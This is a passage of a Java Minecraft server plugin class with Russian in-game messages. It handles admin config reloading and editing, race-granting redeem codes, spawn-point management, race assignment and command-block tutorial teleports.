package sd.sd.commands;

import com.google.common.collect.Lists;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.attribute.Attribute;
import org.bukkit.attribute.AttributeModifier;
import org.bukkit.command.BlockCommandSender;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.Damageable;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.PotionMeta;
import org.bukkit.potion.PotionData;
import org.bukkit.potion.PotionType;
import org.jetbrains.annotations.NotNull;
import sd.sd.Files.Codes;
import sd.sd.Files.FileServer;
import sd.sd.Files.Messages;
import sd.sd.Files.profils;
import sd.sd.SD;
import sd.sd.shops.Shop;
import sd.sd.species.Species;

import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.UUID;

import static sd.sd.SD.*;


public class MainCommand extends AbstractCommand {
//    public String log = "§8[§9§lS§8§lD§8]";
    public ItemStack e;
    private ConsoleCommandSender console = Bukkit.getConsoleSender();

    public MainCommand() {
        super("balt");
    }
    @Override
    public void execute(CommandSender sender, @NotNull Command cmd, String label, String[] args) {
        if(args.length == 0){
            List<String> about = SD.getFileServerAbout().getStringList("AboutServer");
            for (String abouts : about) {
                sender.sendMessage(abouts);
            }
            return;
        }

        if(args.length == 1 && args[0].equalsIgnoreCase("test")) {
            if(sender instanceof Player p) {
                ItemStack i = new ItemStack(Material.BARRIER);
                p.getInventory().addItem(i);
                i = p.getInventory().getItemInMainHand();
                if(i != null) p.sendMessage(i + "");
            }
        }

        if(args[0].equalsIgnoreCase("config") && (sender.hasPermission(admin_perm))) {
            if(args.length == 2) if (args[1].equalsIgnoreCase("reload")) {
                SD.prefix = SD.getInstance().getConfig().getString("info.prefix", "§8[§9§lS§8§lD§8]").replace("&", "§");
                SD.getInstance().reloadConfig();
                SD.getProfils().reloadConfig();
                SD.getCodesSistem().reloadConfig();
                SD.getFileServerAbout().reloadConfig();
                SD.getCrafts().reloadConfig();
                SD.getMessages().reloadConfig();
                SD.getShops().reloadConfig();
                ZonedDateTime e = ZonedDateTime.now();
//                SD.date = e.getMonth() +  " " +  String.valueOf(e.getDayOfMonth()) + " " + e.getHour();
                SD.isHub = SD.getInstance().getConfig().getBoolean("isHub");
                SD.shops = SD.getShops().getShops();

                listOfShops = new ArrayList<>();
                listOfShops.add(new Shop[7]);

                int line = 0;
                int slot = 0;

                for(Shop shop : shops){

                    if(slot >= 6){

                        slot = 0;
                        listOfShops.add(++line, new Shop[7]);

                    }

                    listOfShops.get(line)[slot++] = shop;

                }

                sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиги");
                return;
            }
            if(args[1].equalsIgnoreCase("reload")) if(args.length == 3){
                if(args[2].equalsIgnoreCase("codes")){
                    SD.getCodesSistem().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг " + Codes.NameFile);
                    return;
                }
                if(args[2].equalsIgnoreCase("FileServer")){
                    SD.getFileServerAbout().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг " + FileServer.NameFile);
                    return;
                }
                if(args[2].equalsIgnoreCase("messages")){
                    SD.getMessages().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг " + Messages.NameFile);
                    return;
                }
                if(args[2].equalsIgnoreCase("profiles")){
                    SD.getProfils().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг " + profils.NameFile);
                    return;
                }
                if(args[2].equalsIgnoreCase("config")){
                    SD.getInstance().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг config.yml");
                    return;
                }
                if(args[2].equalsIgnoreCase("crafts")){
                    SD.getCrafts().reloadConfig();
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("config.reload", "&3Конфиг перезагружен"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг crafts.yml");
                    return;
                }
                if(args[2].equalsIgnoreCase("shops")){
                    SD.getShops().reloadConfig();
                    SD.shops = SD.getShops().getShops();
                    listOfShops = new ArrayList<>();
                    listOfShops.add(new Shop[7]);

                    int line = 0;
                    int slot = 0;

                    for(Shop shop : shops){

                        if(slot >= 6){

                            slot = 0;
                            listOfShops.add(++line, new Shop[7]);

                        }

                        listOfShops.get(line)[slot++] = shop;

                    }
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("&3Конфиг и расположения и данные магазинов перезагружены"));
                    console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3перезагрузил конфиг shops.yml и расположения и данные магазинов");

                    return;
                }
                sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("Config.NotFound", "&cКонфиг не найден, &6список конфигов: codes(Codes.yml), FileServer(FileServer.yml), messages(Messages.yml), profiles(profiles.yml), config(config.yml), crafts(Crafts.yml)"));
                return;
            }
            if(args[1].equalsIgnoreCase("set"))  {
                if(args.length >= 5){
                    StringBuilder a = new StringBuilder();
                    for (int i = 4; i < args.length; i++) a.append(args[i]).append(' ');
                    String set = a.toString();
                    if(args[2].equalsIgnoreCase("codes")){
                        SD.getCodesSistem().getConfig().set(args[3], set);
                        SD.getCodesSistem().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг " + Codes.NameFile + " " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("FileServer")){
                        SD.getFileServerAbout().getConfig().set(args[3], set);
                        SD.getFileServerAbout().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг " + FileServer.NameFile + " " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("messages")){
                        SD.getMessages().getConfig().set(args[3], set);
                        SD.getMessages().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг " + Messages.NameFile + " " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("profiles")){
                        SD.getProfils().getConfig().set(args[3], set);
                        SD.getProfils().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг " + profils.NameFile + " " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("config")){
                        SD.getInstance().getConfig().set(args[3], set);
                        SD.getInstance().saveConfig();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг config.yml " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("crafts")){
                        SD.getCrafts().getConfig().set(args[3], set);
                        SD.getCrafts().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг crafts.yml " + set + " по пути " + args[3]);
                        return;
                    }
                    if(args[2].equalsIgnoreCase("shops")){
                        SD.getShops().getConfig().set(args[3], set);
                        SD.getShops().save();
                        sender.sendMessage(SD.prefix + " §2Конфиг изменён и сохранён");
                        console.sendMessage(SD.prefix + " §6" + sender.getName() + " §3вставил в конфиг shops.yml " + set + " по пути " + args[3]);
                        return;
                    }
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("Config.NotFound", "&cКонфиг не найден, &6список конфигов: codes(Codes.yml), FileServer(FileServer.yml), messages(Messages.yml), profiles(profiles.yml), config(config.yml), crafts(Crafts.yml)"));
                    return;
                }else {
                    sender.sendMessage(SD.prefix + " " + SD.getMessages().getString("Config.Error.Set", "&cОшибка! &6Формат вставки в конфиг: /sd config set <конфиг> <путь через точку> <вставляемое>"));
                    return;
                }
            }
            sender.sendMessage(SD.prefix + "\u00a74 Команда введена не верно!");
            return;

        }

        if (SD.isHub && args[0].equalsIgnoreCase("коды")) {
            if ((sender.hasPermission(admin_perm))) {
                if (args.length == 1) {
                    List<String> codes = SD.getCodesSistem().getConfig().getStringList("CodesList");
                    for (String code : codes) {

                        String act = ": §2работает";
                        if (!SD.getCodesSistem().getConfig().getBoolean("Codes." + code + ".Activated"))
                            act = ": §4не работает";
                        sender.sendMessage(SD.prefix + " §9" + code + act);
                    }
                    return;
                }
                if (args.length == 2) {
                    List<String> codes = SD.getCodesSistem().getConfig().getStringList("CodesList");
                    String code = args[1];
                    if (codes.contains(code)){

                        if(Species.getSpecie(SD.getCodesSistem().getConfig().getString("Codes." + code + ".Specie")) == null){
                            sender.sendMessage(SD.prefix + " §4§lВНИМАНИЕ!!!");
                            sender.sendMessage(SD.prefix + " §4§lОБНОРУЖЕНА ОШИБКА ПРИ ПРОВЕРКЕ КОДА!!!");
                            sender.sendMessage(SD.prefix + " §4ПРОСЬБА СООБЩАТЬ В НАШ ДИСКОРД: §7" + SD.getInstance().getConfig().getString("info.discord", "https://discord.gg/4TFFhqFFDR"));
                            sender.sendMessage(SD.prefix + " §4Код ошибки: §8Раса");
                            Bukkit.getConsoleSender().sendMessage("§4§lВНИМАНИЕ ПРИ ОБРАБОТКЕ КОДА §7" + code + " §4ПРОИЗОШЛА ОШИБКА: §8Раса");
                            return;
                        }

                        if((SD.getCodesSistem().getConfig().getInt("Codes." + code + ".NumberOfUsing", 54654656)) == 54654656){
                            sender.sendMessage(SD.prefix + " §4§lВНИМАНИЕ!!!");
                            sender.sendMessage(SD.prefix + " §4§lОБНОРУЖЕНА ОШИБКА ПРИ ПРОВЕРКЕ КОДА!!!");
                            sender.sendMessage(SD.prefix + " §4ПРОСЬБА СООБЩАТЬ В НАШ ДИСКОРД: §7" + SD.getInstance().getConfig().getString("info.discord", "https://discord.gg/4TFFhqFFDR"));
                            sender.sendMessage(SD.prefix + " §4Код ошибки: §8Кол-во использований");
                            Bukkit.getConsoleSender().sendMessage("§4§lВНИМАНИЕ ПРИ ОБРАБОТКЕ КОДА §7" + code + " §4ПРОИЗОШЛА ОШИБКА: §8Кол-во использований");
                            return;
                        }

                        sender.sendMessage(SD.prefix + " §3Информация о коде " + code);
                        if (SD.getCodesSistem().getConfig().getBoolean("Codes." + code + ".Activated", false)) sender.sendMessage("§9Статус кода: §4Неактивен"); else sender.sendMessage("§9Статус кода: §2Активен");
//                        sender.sendMessage("§9Статус(не права) дающий код: §6" + Balt.getCodesSistem().getConfig().getString("Codes." + code + ".StatusCode"));
                        if (SD.getCodesSistem().getConfig().getStringList("Codes." + code + ".Players").isEmpty()){
                            sender.sendMessage("§9Данный код ещё никем не был использован");
                        }else{
                            sender.sendMessage("§9Использовался:");
                            for (String player : SD.getCodesSistem().getConfig().getStringList("Codes." + code + ".Players")){
                                sender.sendMessage(" §7- §6" + player);
                            }
                        }
                        sender.sendMessage("§9Количество оставшихся использований: §6" + SD.getCodesSistem().getConfig().getInt("Codes." + code + ".NumberOfUsing"));
                        sender.sendMessage("§9Раса которую даёт код: §6" + Species.getSpecieName(SD.getCodesSistem().getConfig().getString("Codes." + code + ".Specie")));

                    }else{

                        sender.sendMessage(SD.prefix + " §4Код не существует");
                        return;

                    }
                    return;
                }
                if (args[1].equalsIgnoreCase("создать")) {

                    List<String> codes = SD.getCodesSistem().getConfig().getStringList("CodesList");
                    String key = args[2];
                    if(codes.contains(key)){
                        sender.sendMessage(SD.prefix + " §4Код уже существует");
                        return;
                    }
                    if(args.length < 4){
                        sender.sendMessage(SD.prefix + " §4Ошибка! §6Формат команды: §3§l/sd коды создать [код] [раса] [максимальное количество активаций] ");//[статус дающий код(админ/игрок/мер...)]
                    }

                    if(Species.getSpecie(Species.getSpecieName(args[3])) == null){

                        sender.sendMessage(SD.prefix + " §4Раса §6" + args[3] + " §4не найдена");
                        sender.sendMessage(SD.prefix + " §3Расы: §6люди§7, §6звероподобные§7, §6слаймы§7, §6азари§7, §6демоны§7, §6дракониды");
                        return;

                    }

                    if (args.length == 4) {
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Activated", true);
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Specie", args[3]);
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".StatusCode", "Игрок");
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Players", new ArrayList<>());
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".NumberOfUsing", 1);
                        List<String> myList = SD.getCodesSistem().getConfig().getStringList("CodesList");
                        myList.add(key);
                        SD.getCodesSistem().getConfig().set("CodesList", myList);
                        SD.getCodesSistem().save();
                        sender.sendMessage(SD.prefix + " §2Ключ §5" + key + " §2успешно добавлен!");
                        return;
                    }

                    if (args.length == 5) {
                        int actcount = Integer.parseInt(args[4]);
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Activated", true);
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".StatusCode", "Игрок");
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Specie", args[3]);
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".Players", new ArrayList<>());
                        SD.getCodesSistem().getConfig().set("Codes." + key + ".NumberOfUsing", actcount);
                        List<String> myList = SD.getCodesSistem().getConfig().getStringList("CodesList");
                        myList.add(key);
                        SD.getCodesSistem().getConfig().set("CodesList", myList);
                        SD.getCodesSistem().save();
                        sender.sendMessage(SD.prefix + " §2Ключ §5" + key + " §2успешно добавлен!");
                        return;
                    }

//                    if (args.length == 5) {
//                        int actcount = Integer.parseInt(args[3]);
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".Activated", true);
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".StatusCode", args[4]);
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".Players", new ArrayList<>());
//                        Balt.getCodesSistem().getConfig().set("Codes." + key + ".NumberOfUsing", actcount);
//
//                        codes.add(key);
//                        Balt.getCodesSistem().getConfig().set("CodesList", codes);
//                        Balt.getCodesSistem().save();
//                        sender.sendMessage(Balt.sd + " §2Ключ §5" + key + " §2успешно добавлен!");
//                        return;
//                    }

                    sender.sendMessage(SD.prefix + " §4Ошибка! §6Формат команды: §3§l/sd коды создать [код] [раса] [максимальное количество активаций] ");//[статус дающий код(админ/игрок/мер...)]
                }
                if (args[1].equalsIgnoreCase("активировать")) {
                    sender.sendMessage(SD.prefix + " §2Код §5" + args[2] + " §2активирован");
                    SD.getCodesSistem().getConfig().set("Codes." + args[2] + ".Activated", true);
                    SD.getCodesSistem().save();
                    return;
                }
                if (args[1].equalsIgnoreCase("деактивировать")) {
                    sender.sendMessage(SD.prefix + " §4Код §5" + args[2] + " §4деактивирован");
                    SD.getCodesSistem().getConfig().set("Codes." + args[2] + ".Activated", false);
                    SD.getCodesSistem().save();
                    return;
                }
                if (args[1].equalsIgnoreCase("удалить")) {
                    List<String> codes = SD.getCodesSistem().getConfig().getStringList("CodesList");
                    String key = args[2];
                    SD.getCodesSistem().getConfig().set("Codes." + key, null);
                    SD.getCodesSistem().save();
                    if(!codes.contains(key)){
                        sender.sendMessage(SD.prefix + " §4Код уже не существует");
                        return;
                    }
                    codes.remove(key);
                    SD.getCodesSistem().getConfig().set("CodesList", codes);
                    SD.getCodesSistem().save();
                    sender.sendMessage(SD.prefix + " §6Код §5" + args[2] + " §4удалён");
                    return;
                }
            }
        }

        if(SD.isHub && args[0].equalsIgnoreCase("спавн")){
            if(args.length == 1){
                if(sender instanceof Player){
                    if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                        Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                        ((Player) sender).teleport(spawnloc);
                        sender.sendMessage(SD.prefix + " §3Вы перемещены на спавн");
                    }else{
                        sender.sendMessage(SD.prefix + " §4Точка спавна не установлена");
                    }
                    return;
                }else{
                    sender.sendMessage(SD.prefix + " §4Для этого надо быть игроком");
                    return;
                }
            }
            if(args[1].equalsIgnoreCase("узнать")){
                if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                    Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                    sender.sendMessage(SD.prefix + " §3X: §7" + spawnloc.getX() + " §3Y: §7" + spawnloc.getY() + " §3Z: §7" + spawnloc.getZ());
                }else{
                    sender.sendMessage(SD.prefix + " §4Точка спавна не установлена");
                }
                return;
            }
            if(args[1].equalsIgnoreCase("переместиться")){
                if(args.length == 2) if(sender instanceof Player){
                    if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                        Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                        ((Player) sender).teleport(spawnloc);
                        sender.sendMessage(SD.prefix + " §3");
                    }else{
                        sender.sendMessage(SD.prefix + " §4Точка спавна не установлена");
                    }
                }else{
                    sender.sendMessage(SD.prefix + " §4Для этого надо быть игроком");
                }
                if(args.length == 3){
                    if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                        if (Bukkit.getOnlinePlayers().contains(args[2])) {
                            Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                            Bukkit.getPlayer(args[2]).teleport(spawnloc);
                        } else {
                            sender.sendMessage(SD.prefix + " §4Точка спавна не установлена");
                        }
                    }else{
                        sender.sendMessage(SD.prefix + " §4Игрок не найден");
                    }
                }
                return;
            }
            if(args[1].equalsIgnoreCase("установить")) {
                if(args.length > 3){
                if (args[2].equalsIgnoreCase("X")) {
                    if (args.length == 4) {
                        if (SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                            Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                            spawnloc.setX(Double.parseDouble(args[3]));
                            SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                            SD.getInstance().saveConfig();
                            sender.sendMessage(SD.prefix + " §3X координата точки спавна установлена");
                        } else {
                            sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                        }
                    }
                    return;
                }
                if (args[2].equalsIgnoreCase("Y")) {
                    if (args.length == 4) {
                        if (SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                            Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                            spawnloc.setY(Double.parseDouble(args[3]));
                            SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                            SD.getInstance().saveConfig();
                            sender.sendMessage(SD.prefix + " §3Y координата точки спавна установлена");
                        } else {
                            sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                        }
                    }
                    return;
                }
                if (args[2].equalsIgnoreCase("Z")) {
                    if (args.length == 4) {
                        if (SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                            Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                            spawnloc.setZ(Double.parseDouble(args[3]));
                            SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                            SD.getInstance().saveConfig();
                            sender.sendMessage(SD.prefix + " §3Z координата точки спавна установлена");
                        } else {
                            sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                        }
                    }
                    return;
                }
            }
                if (sender instanceof Player) {
                    if (args.length == 2) {
                        SD.getInstance().getConfig().set("Spawn.Location", ((Player) sender).getLocation());
                        SD.getInstance().saveConfig();
                        sender.sendMessage(SD.prefix + " §3Точка спавна установлена");
                        return;
                    }
                    if (args[2].equalsIgnoreCase("я")) {
                        if (args.length == 3) {
                            SD.getInstance().getConfig().set("Spawn.Location", ((Player) sender).getLocation());
                            SD.getInstance().saveConfig();
                            sender.sendMessage(SD.prefix + " §3Точка спавна установлена");
                        }
                    }
                    if (args.length == 4) {
                        if (args[3].equalsIgnoreCase("XYZ+взгляд")) {
                            SD.getInstance().getConfig().set("Spawn.Location", ((Player) sender).getLocation());
                            SD.getInstance().saveConfig();
                            sender.sendMessage(SD.prefix + " §3Точка спавна установлена");
                        }
                        if (args[3].equalsIgnoreCase("X")) {
                            if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                                Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                                spawnloc.setX(((Player) sender).getLocation().getX());
                                SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                                SD.getInstance().saveConfig();
                                sender.sendMessage(SD.prefix + " §3X координата точки спавна установлена");
                            }else{
                                sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                            }
                        }
                        if (args[3].equalsIgnoreCase("Y")) {
                            if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                                Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                                spawnloc.setY(((Player) sender).getLocation().getY());
                                SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                                SD.getInstance().saveConfig();
                                sender.sendMessage(SD.prefix + " §3Y координата точки спавна установлена");
                            }else{
                                sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                            }
                        }
                        if (args[3].equalsIgnoreCase("Z")) {
                            if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                                Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                                spawnloc.setZ(((Player) sender).getLocation().getZ());
                                SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                                SD.getInstance().saveConfig();
                                sender.sendMessage(SD.prefix + " §3Z координата точки спавна установлена");
                            }else{
                                sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                            }
                        }
                        if (args[3].equalsIgnoreCase("взгляд")) {
                            if(SD.getInstance().getConfig().getLocation("Spawn.Location") != null) {
                                Location spawnloc = SD.getInstance().getConfig().getLocation("Spawn.Location");
                                spawnloc.setDirection(((Player) sender).getLocation().getDirection());
                                SD.getInstance().getConfig().set("Spawn.Location", spawnloc);
                                SD.getInstance().saveConfig();
                                sender.sendMessage(SD.prefix + " §3Точка направления взгляда на спавне установлена");
                            }else{
                                sender.sendMessage(SD.prefix + " §4Точка спавна не установлена, устанавливать её по частям нельзя");
                            }
                        }
                    }
                }else{
                    sender.sendMessage(SD.prefix + " §4Для этого надо быть игроком(можно установить точку спавна по координатам, через /sd спавн установить XYZ/X/Y/Z)");
                }
                return;
            }
        }

        if(args[0].equalsIgnoreCase("раса") && sender.hasPermission(admin_perm)){

            if (args.length == 1){

                sender.sendMessage(SD.prefix + " §3Использование: §6/" + label + " раса забрать <игрок>/выдать <раса> <игрок>");

                return;

            }

            if (args.length == 4)
                if(args[1].equalsIgnoreCase("выдать")){

                    Player target = Bukkit.getPlayerExact(args[3]);

                    if(target == null){

                        sender.sendMessage(SD.prefix + " §4Игрок §6" + args[3] + " §4не найден");
                        return;

                    } else {

                        if(Species.getSpecie(Species.getSpecieName(args[2])) == null){

                            sender.sendMessage(SD.prefix + " §4Раса §6" + args[2] + " §4не найдена");
                            sender.sendMessage(SD.prefix + " §3Расы: §6люди§7, §6звероподобные§7, §6слаймы§7, §6азари§7, §6азари§7, §6дворфы§7, §6демоны§7, §6дракониды");
                            return;

                        }

                        Species.getSpecie(Species.getSpecieName(args[2])).setSpecieTo(target);
                        sender.sendMessage(SD.prefix + " §2Раса §6" + args[2] + " §2выдана §6" + args[3]);
                        return;
                    }

                }

                if(args.length == 3)if(args[1].equalsIgnoreCase("забрать")){

                    Player target = Bukkit.getPlayerExact(args[2]);

                    if(target == null){

                        sender.sendMessage(SD.prefix + " §4Игрок §6" + args[2] + " §4не найден");
                        return;

                    } else {
                        Species specie = Species.getSpecie(target);
                        if(specie != null) {
                            Species.removeSpecieFrom(target);
                            sender.sendMessage(SD.prefix + " §2Раса §6" + Species.getSpecieName(specie.getSpecieName()) + " §2забрана у §6" + args[2]);
                            return;
                        } else {
                            sender.sendMessage(SD.prefix + " §3Расы не были найдены у §6" + args[2]);
                            return;
                        }
                    }

                }


            sender.sendMessage(SD.prefix + " §3Использование: §6/" + label + " раса забрать <игрок>/выдать <раса> <игрок>");
            return;

        }

        if(SD.isHub && sender instanceof BlockCommandSender b){

            if(args[0].equalsIgnoreCase("обучение")){

                boolean nullTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -28).isEmpty();
                boolean firstTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -30).isEmpty();
                boolean secondTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -32).isEmpty();
                boolean thirdTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -34).isEmpty();
                boolean fourthTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -36).isEmpty();
                boolean fifthTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -38).isEmpty();
                boolean sixthTutorial = !b.getBlock().getWorld().getBlockAt(18, 156, -40).isEmpty();

                Player NearPlayer = null;
                double i = 0;
                int c = 0;
                while(NearPlayer == null){
                    if(b.getBlock().getLocation().getNearbyPlayers(i, 4).size() == 0){
                        i = i + 1;
                    }else if(b.getBlock().getLocation().getNearbyPlayers(i, 4).size() > 1){
                        if(c < 10){
                            i = i - 0.1;
                            c++;
                        }else{
                            i = i - 0.01;
                            c++;
                        }
                        if(c>25){
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }else if(b.getBlock().getLocation().getNearbyPlayers(i, 4).size() == 1){
                        NearPlayer = (Player) b.getBlock().getLocation().getNearbyPlayers(i, 4).toArray()[0];
                    }else{
                        sender.sendMessage("Ошибка");
                        return;
                    }
                }


                if(nullTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -27.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -28).setType(Material.AIR);
                    return;

                }

                if(firstTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -29.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -30).setType(Material.AIR);
                    return;

                }

                if(secondTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -31.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -32).setType(Material.AIR);
                    return;

                }

                if(thirdTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -33.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -34).setType(Material.AIR);
                    return;

                }

                if(fourthTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -35.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -36).setType(Material.AIR);
                    return;

                }

                if(fifthTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -37.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -38).setType(Material.AIR);
                    return;

                }

                if(sixthTutorial){

                    NearPlayer.teleport(new Location(NearPlayer.getWorld(), 18.5, 152, -39.5));
                    b.getBlock().getWorld().getBlockAt(18, 156, -40).setType(Material.AIR);
                    return;

                }

                NearPlayer.sendMessage(SD.prefix + " §4Все обучения заняты!");
                return;

            }


            if(args[0].equalsIgnoreCase("выдать")){
                if(args.length == 1){
                    sender.sendMessage("Ошибка");
                    return;
                }
                if(args[1].equalsIgnoreCase("позорная_труба")){
                    Player NearPlayer = null;
                    double i = 1;
                    int c = 0;
                    while(NearPlayer == null){
                        if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 0){
                            i = i + 1;
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() > 1){
                            if(c < 10){
                                i = i - 0.1;
                                c++;
                            }else{
                                i = i - 0.01;
                                c++;
                            }
                            if(c>25){
                                sender.sendMessage("Ошибка");
                                return;
                            }
                        }else if(((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).size() == 1){
                            NearPlayer = (Player) ((BlockCommandSender)sender).getBlock().getLocation().getNearbyPlayers(i).toArray()[0];
                        }else{
                            sender.sendMessage("Ошибка");
                            return;
                        }
                    }
                    ItemStack item = new ItemStack(Material.SPYGLASS);
                    ItemMeta m = item.getItemMeta();
                            if(sender instanceof ConsoleCommandSender) {
                        StringBuilder a = new StringBuilder();
                        for (int j = 0; j < args.length; j++) a.append(args[j]).append(' ');
                        String act = a.toString();
                        act = act.replace("&", "§");
                        for(Player player : Bukkit.getOnlinePlayers()){
                            player.sendMessage("§5* §6сервер §5 " + act);
                        }
                        Bukkit.getConsoleSender().sendMessage("§5* §6сервер §5 " + act);
                        return;
                    }
                    if(sender instanceof Player) {
                        Player p = Bukkit.getPlayer(sender.getName());
                        if (args.length == 0) {
